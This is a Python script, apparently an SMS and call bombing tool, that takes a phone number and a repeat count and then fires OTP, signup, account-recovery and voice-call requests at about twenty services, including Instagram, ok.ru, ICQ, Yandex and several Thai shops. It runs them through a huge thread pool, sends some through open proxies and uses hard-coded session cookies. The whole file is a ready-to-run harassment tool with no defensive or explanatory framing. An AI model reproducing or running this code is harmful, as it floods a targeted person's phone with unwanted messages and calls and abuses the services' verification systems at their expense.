#ของใครก็ไม่รู้ของฟรี
import requests,json,time, sys, threading, random, os, time, sys
from requests import Session,post,get
from re import search
from concurrent.futures import ThreadPoolExecutor
exec = ThreadPoolExecutor(max_workers=int(100000))
os.system("cls")
try:
	phonenumber = input("Phone : ")
except:
	print('USAGE : SMS_ 09xxxxxxxx')
	input()
	exit()
if phonenumber.startswith('0'):
	pass
else:
	print('PHONENUMBER : Not start with 0')
	input()
	exit()
count = input("Count : ")
headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}

def shopat(phone):
    s=Session()
    s.headers.update(headers)
    token=search('<meta name="_csrf" content="(.*)" />',s.get("https://www.shopat24.com/register/").text).group(1)
    d=s.post("https://www.shopat24.com/register/ajax/requestotp/",data=f"phoneNumber={phone}",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","x-csrf-token": token}).status_code
    if d == 200:
        print(f"{d} | shopat24")
    else:
        print(f"{d} | shopat24")


def p1112(phone):
    d=post('https://api2.1112.com/api/v1/otp/create',json={"phonenumber":phone,"language":"th"},headers=headers).status_code
    if d == 200:
        print(f"{d} | 1112.com")
    else:
        print(f"{d} | 1112.com")


def p1112v2(phone):
    d=post('https://api.1112delivery.com/api/v1/otp/create',json={"phonenumber":phone,"language":"th"},headers=headers).status_code
    if d == 200:
        print(f"{d} | 1112delivery.com")
    else:
        print(f"{d} | 1112delivery.com")


def okru(phone):
    s=Session()
    s.headers.update({"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38","Content-Type" : "application/x-www-form-urlencoded","Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"})
    s.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data=f"st.r.phone=+66{phone[1:]}")
    re = s.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",data="st.r.fieldAcceptCallUIButton=Call")
    print(f"{re} | okru")

def findclone(phone):
    d=get(f"https://findclone.ru/register?phone=+66{phone[1:]}",headers={"X-Requested-With" : "XMLHttpRequest","User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"}).json()
    if d.get("Error",False) == "Wait for timeout":
        print(f"400 | findclone")
    else:
        print(f"200 | findclone")

def unacademy(phone):
    d=post("https://unacademy.com/api/v3/user/user_check/",json={"phone":phone,"country_code":"TH"},headers=headers).json()
    if d.get("error_code",False):
        print(f"{d} | unacademy")
    else:
        print(f"{d} | unacademy")

def icq(phone):
    a = post(f"https://u.icq.net/api/v4/rapi",json={"method":"auth/sendCode","reqId":"24973-1587490090","params":{"phone": f"66{phone[1:]}","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}},headers=headers)
    print(f"{a} | icq")


def ig_token():
    d=get("https://www.instagram.com/",headers=headers).headers['set-cookie']
    d=search("csrftoken=(.*);",d).group(1).split(";")
    return d[0],d[10].replace(" Secure, ig_did=","")

def instagram(phone):
    token,_=ig_token()
    d=post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username=66{phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","X-CSRFToken":token}).json()
    if d["status"] == "ok":
        print(f"{d} | instagram")
    else:
        print(f"{d} | instagram")


def instagramv2(phone):
    token,cid=ig_token()
    d=post("https://www.instagram.com/accounts/send_signup_sms_code_ajax/",data=f"client_id={cid}&phone_number=66{phone}&phone_id=&big_blue_token=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","X-CSRFToken":token}).json()
    if d["status"] == "ok":
        print(f"{d} | instagram 2")
    else:
        print(f"{d} | instagram 2")


def yandex(phone):
    d=post("https://taxi.yandex.kz/3.0/launch/",json={},headers=headers).json()
    d=post("https://taxi.yandex.kz/3.0/auth/",json={"id": d["id"], "phone": f"+66{phone[1:]}"},headers=headers).text
    if d == "{}":
        print(f"500 | yandex2")
    else:
        print(f"200 | yandex2")


def homepro(phone):
    d=post("https://www.homepro.co.th/service/user/profile/otp.jsp",data=f"action=otp&user_mobile_number={phone}",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36","x-csrf-token": "AaqCrWeoDAPdJqmFtCnSCJN8a1mECsPB","content-type": "application/x-www-form-urlencoded; charset=UTF-8","cookie": "h11e_uuid=5da6d569-5a72-4014-afef-40990862f26e; ltcid=4ac7dc78-ae73-4617-ba28-75b31ed3bc9f; ltsid=9b139725-fc38fbcc; _gid=GA1.3.1373861600.1635677257; _fbp=fb.2.1635677258036.1072722582; h11e_data1=ZTE1MWFkY2ZjMDk3ODk1MzhiMzk1MzM0OTc5NDMzMmIzOWEyOGVhNWU3NWU1NzQzODJhODMyM2U1MWI3MGQ0Yzg1MWM4MGEzYjJmMjUwYTUxMThjZGU2YTQ3NzVkNDMy; h11e_lang=th; _dc_gtm_UA-112826849-3=1; h11e_user=N2NlM2E4ODNkYjQxNjcwNTg3YzgxN2UwZWJiMDFkNmU0ZWUzM2M0M2U2YTJmNTkxMzA2NjYxYzU2MTFiNjFjNw==; h11e_csrf=AaqCrWeoDAPdJqmFtCnSCJN8a1mECsPB; JSESSIONID=06E6906132FE92B731D49BFD2F00877D; _ga=GA1.3.106485705.1635677257; _ga_RMXSTMQMK7=GS1.1.1635677253.1.1.1635677348.0"}).json()
    if d["msgtype"] == "success":
        print(f"{d} | homepro.co.th")
    else:
        print(f"{d} | homepro.co.th")

def prettygaming():
	re = requests.post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send", data = {"tel":phonenumber,"otp_type":"register"}, headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36"}, proxies = {"http": "http://182.52.103.144:8080"})
	print(f"{re} | prettygaming168")

def berlnw():
	re = requests.post("https://www.berlnw.com/reservelogin",data={"p_myreserve": phonenumber}, headers={"Host": "www.berlnw.com", "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded", "Save-Data": "on", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "https://www.berlnw.com/myaccount", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "th-TH,th;q=0.9,en;q=0.8", "Cookie": "berlnw=s%3AaKEA2ULex-QQ7U6jr0WCQGs-Mz3eJFJn.RsAXcleV2EVFN4j%2BPqDivbqSYAta0UYtyoM65BrxuV0; _referrer_og=https%3A%2F%2Fwww.google.com%2F; _first_pageview=1; _jsuid=4035440860; _ga=GA1.2.766623232.1635154743; _gid=GA1.2.1857466267.1635154743; _gac_UA-90695720-1=1.1635154743.CjwKCAjwq9mLBhB2EiwAuYdMtU_gp7mSvFcH4kByOTGf-LsmLTGujv9qCwMi1xwWSuEiQSOlODmN-RoCMu4QAvD_BwE; _fbp=fb.1.1635154742776.771793600; _gat_gtag_UA_90695720_1=1"}, proxies = {"http": "http://182.52.103.144:8080"})
	print(f"{re} | www.berlnw.com")

def foodland():
	re = requests.post("https://shop.foodland.co.th/login/generation", data={"phone": phonenumber}, proxies = {"http": "http://182.52.103.144:8080"})
	print(f"{re} | shop.foodland.co.th")

def ondemand():
	re = requests.post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", data = "phone="+phonenumber+"&type=phone&resend=0&pinid=", headers = {"accept": "application/json, text/javascript, */*; q=0.01", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "x-requested-with": "XMLHttpRequest", "user-agent": "Mozilla/5.0 (Linux; Android 5.1; A1601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36", "cookie": "sqzllocal=sqzl614a950a0000008a8892;private_content_version=a8f313c36d800596d69c0634f8364ba7;PHPSESSID=0bfasg27occf98ngcr0p3mqlt7;_gcl_au=1.1.1797077583.1635431429;_hjid=16751239-bad6-46a9-b2f0-01bb94d26f2b;sqzl_session_id=617ab409000003ef5950|1635431433.703;_ga=GA1.4.1468961660.1635431432;_gid=GA1.4.108830963.1635431434;_gid=GA1.3.108830963.1635431434;_fbp=fb.2.1635431435074.169114230;sqzl_abs=0;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_hjIncludedInSessionSample=1;mage-cache-storage=%7B%7D;mage-cache-storage-section-invalidation=%7B%7D;mage-cache-sessid=true;form_key=Pl5vFXKEPwQqulEz;mage-messages=;recently_viewed_product=%7B%7D;recently_viewed_product_previous=%7B%7D;recently_compared_product=%7B%7D;recently_compared_product_previous=%7B%7D;product_data_storage=%7B%7D;_ga_V7G71JV0ES=GS1.1.1635431429.1.1.1635431596.18;_ga=GA1.3.1468961660.1635431432;section_data_ids=%7B%22messages%22%3A1635431607%2C%22customer%22%3A1635431607%2C%22compare-products%22%3A1635431607%2C%22last-ordered-items%22%3A1635431607%2C%22cart%22%3A1635431742%2C%22directory-data%22%3A1635431607%2C%22instant-purchase%22%3A1635431607%2C%22persistent%22%3A1635431607%2C%22review%22%3A1635431607%2C%22wishlist%22%3A1635431607%2C%22ammessages%22%3A1635431607%2C%22gtm%22%3A1635431607%2C%22recently_viewed_product%22%3A1635431607%2C%22recently_compared_product%22%3A1635431607%2C%22product_data_storage%22%3A1635431607%2C%22paypal-billing-agreement%22%3A1635431607%2C%22checkout-fields%22%3A1635431607%2C%22collection-point-result%22%3A1635431607%7D"})
	print(f"{re} | shoponline.ondemand.in.th")

def pizza():
	re = requests.post("https://api.1112delivery.com/api/v1/otp/create", data = {"phonenumber":""+phonenumber+"","language":"th"}, headers = {})
	print(f"{re} | 1112delivery.com")

def kitchenhub():
	re = requests.post("https://www.kaitorasap.co.th/api/index.php/send-otp/", data="phone_number="+phonenumber+"&lag=", headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Cookie": "PHPSESSID=f5nrukmps3fa5gk25eh4v0tgg0; _ga=GA1.3.1240095898.1635597163; _gid=GA1.3.747741928.1635597163; _gat_gtag_UA_141105037_1=1"},proxies = {"http": "http://185.104.252.10:9090"})
	print(f"{re} | www.kaitorasap.co.th")

def fox888():
	re = requests.post("https://www.fox888.com/api/otp/register", data = "applicant="+phonenumber+"&serviceName=FOX888", headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "*/*", "X-Requested-With": "XMLHttpRequest"})
	print(f"{re} | www.fox888.com")

def kaitorasap():
	re = requests.post("https://www.kaitorasap.co.th/api/index.php/send-otp/", data = "phone_number="+phonenumber+"r&lag=", headers = {"Host": "www.kaitorasap.co.th", "Connection": "keep-alive", "Accept": "application/json, text/javascript, */*; q=0.01", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-with": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Linux; Android 5.1; A1601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36", "Referer": "https://www.kaitorasap.co.th/login/", "Accept-Encoding": "gzip, deflate, br", "Accept-Encoding": "th-TH,th;q=0.9,en;q=0.8", "Cookie": "PHPSESSID=p6jos17e5m0nkc1bmt0trlcrv4; _ga=GA1.3.1940619970.1635597478; _gid=GA1.3.1491460319.1635597478; _gat_gtag_UA_141105037_1=1"})
	print(f"{re} | www.kaitorasap.co.th")


def start(phonenumber):
    exec.submit(shopat,phonenumber)
    exec.submit(p1112,phonenumber)
    exec.submit(p1112v2,phonenumber)
    exec.submit(homepro,phonenumber)
    exec.submit(kitchenhub)
    exec.submit(pizza)
    exec.submit(ondemand)
    exec.submit(foodland)
    exec.submit(berlnw)
    exec.submit(prettygaming)
    exec.submit(fox888)
    exec.submit(kaitorasap)
    exec.submit(okru,phonenumber)#call
    exec.submit(findclone,phonenumber)#call
    exec.submit(unacademy,phonenumber)
    exec.submit(icq,phonenumber)
    exec.submit(instagram,phonenumber)
    exec.submit(instagramv2,phonenumber)
    exec.submit(yandex,phonenumber)

for i in range(int(count    )):
    start(phonenumber)
